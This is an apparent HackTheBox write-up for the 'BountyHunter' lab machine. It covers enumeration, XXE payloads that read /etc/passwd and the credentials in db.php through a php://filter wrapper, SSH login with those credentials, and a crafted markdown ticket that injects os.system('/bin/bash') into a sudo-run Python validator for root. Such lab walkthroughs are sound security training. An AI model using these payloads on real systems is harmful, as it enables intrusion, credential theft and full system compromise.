---
title: HTB-BountyHunter
draft: false
tags:
  - htb
  - linux
  - easy
  - xxe
  - sudoers
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/BountyHunter.png)

## Information Gathering
### Rustscan

Rustscan finds SSH and HTTP running:

`rustscan --addresses 10.10.11.100 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-1.png)

## Enumeration
### HTTP - TCP 80

Website seems pretty simple. Let's take at the menus at top-right corner.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image.png)

`/portal.php` is underdevelopment and leads us to `/log_submit.php`. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-2.png)

`/log_submit.php` is a Bounty Report System:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-3.png)

Let's see if there are any other directories using feroxbuster:

`sudo feroxbuster -u http://10.10.11.100 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-9.png)

**db.php** is found but it returns empty screen.

### log_submit.php

Let's intercept the traffic with some random data as input:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-5.png)

It seems that the input data is enocded to one big chunk and it is being sent. 

When we forward the traffic, we can see the result:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-4.png)

Decoding the data piece using Burp Suite Decoder(URL Decode -> Base64 Decode), it seems to be xml encoded:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-7.png)

Seeing xml instantly reminded me of **XXE**.

## Shell as Development
### XXE

Below is how the input data is saved as xml:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>teset</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>123</reward>
		</bugreport>
```

Let's craft a malicious xml data piece so that it will read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>123</reward>
		</bugreport>
```

After saving the above xml to a txt file, we will base64 encode it:

`base64 -w0 xxe.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-6.png)

Copy-paste the base64 encoded result to data parameter and url encode it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-8.png)

Upon sending the data, we can see result for `/etc/passwd`.

Remembering **db.php** from earlier, we will slightly modify the xml to access db.php:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///var/www/html/db.php" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>123</reward>
		</bugreport>
```

However, for some reason, we cannot access db.php:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-10.png)

Let's try base64 encoding it:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
<bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
</bugreport>
```

After base64 encoding the xml request for **db.php**, we get a result in base64 encoded format:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-11.png)

Decoding it, we are provided with credentials:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-12.png)

We tried log in to ssh as admin but it won't work. 

Remembering the result from earlier for `/etc/passwd`, we have the user **development** on the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-13.png)

Trying the login as **development**, we can ssh in:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-14.png)


## Privesc: development to root
### Sudoers

`/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` can be run with sudo privilege:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-15.png)

ticketValidator.py taking **md** file as the input and using as a ticket:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-16.png)

Based on the ticket format requirement, we can craft a malicious md file that will execute command `id`:

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('id')**
```

After saving the above to **test.md**, we can run ticketValidator.py towards it and successfully execute commands as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-17.png)


Let's slightly modify the code so that we can get a shell as the root:

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('/bin/bash')**
```

Now we have the shell as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bountyhunter/image-18.png)